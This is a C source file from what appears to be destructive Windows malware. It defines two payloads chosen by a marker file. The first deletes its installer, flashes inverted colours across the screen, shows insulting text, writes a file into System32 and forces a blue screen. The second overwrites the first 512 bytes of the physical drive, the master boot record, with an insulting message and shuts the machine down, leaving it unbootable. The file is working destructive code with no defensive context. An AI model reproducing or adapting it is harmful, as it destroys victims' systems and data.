#include "payloads.h"
#include "deleteinsta.h"
#include "gdi.h"
#include "tools.h"
#include <corecrt_wstdlib.h>
#include <errhandlingapi.h>
#include <fileapi.h>
#include <wingdi.h>
#include <winnt.h>
#include <winuser.h>



static inline VOID FirstPayload(){
    static BOOL init = FALSE;
    if(init == FALSE){
        DeleteInstaller();
        init = TRUE;
    }
    
    HBRUSH red = CreateSolidBrush(RGB(100, 0, 0));
    HBRUSH green = CreateSolidBrush(RGB(0, 100, 0));
    HBRUSH blue = CreateSolidBrush(RGB(0, 0, 100));
    int prevtime = timeGetTime();
    while(1){
        if (timeGetTime() - prevtime >= 60000) break;
        SelectObject(GDIReturnDC(), red);
        PatBlt(GDIReturnDC(), 0, 0, GDIReturnScreenX(), GDIReturnScreenY(), PATINVERT);
        SelectObject(GDIReturnDC(), green);
        PatBlt(GDIReturnDC(), 0, 0, GDIReturnScreenX(), GDIReturnScreenY(), PATINVERT);
        SelectObject(GDIReturnDC(), blue);
        PatBlt(GDIReturnDC(), 0, 0, GDIReturnScreenX(), GDIReturnScreenY(), PATINVERT);
    }
    DeleteObject(red);
    DeleteObject(green);
    DeleteObject(blue);
    prevtime = timeGetTime();
    while(1){
        if (timeGetTime() - prevtime >= 12000) break;
        MalDrawText(GDIReturnDC(), 10, 10, 20, L"Wheres your accomplishments anon? Where are they???", RGB(255, 255, 255));
        MalDrawText(GDIReturnDC(), 10, 60, 20, L"your \"high iq\" is a waste", RGB(255, 255, 255));
    }
    MalCreateFile("C:\\Windows\\System32\\hal.ini");
    BlueScreenSystem();
}

static inline VOID SecondPayload(){
    HBRUSH blue = CreateSolidBrush(RGB(0, 0, 255));
    int prevtime = timeGetTime();
    while(1){
        if (timeGetTime() - prevtime >= 60000) break;
        SelectObject(GDIReturnDC(), blue);
        PatBlt(GDIReturnDC(), 0, 0, GDIReturnScreenX(), GDIReturnScreenY(), PATINVERT);
    }
    DeleteObject(blue);
    HANDLE hMasterBootRecord = CreateFileW(L"\\\\.\\PhysicalDrive0", 
                                GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 
                                NULL, OPEN_EXISTING, 0, 0);
    WriteFile(hMasterBootRecord, "I told you so, you are nothing but a worthless pest, and no you aren't superior to ANYONE, your IQ did NOTHING to make you a worthful human", 
            512, NULL, NULL);
    CloseHandle(hMasterBootRecord);
    ShutdownSystem();
}


VOID PayloadManager(){
    if(!CheckIfFileExists("C:\\Windows\\System32\\hal.ini")){
        FirstPayload();
    }
    else {
        SecondPayload();
    }
}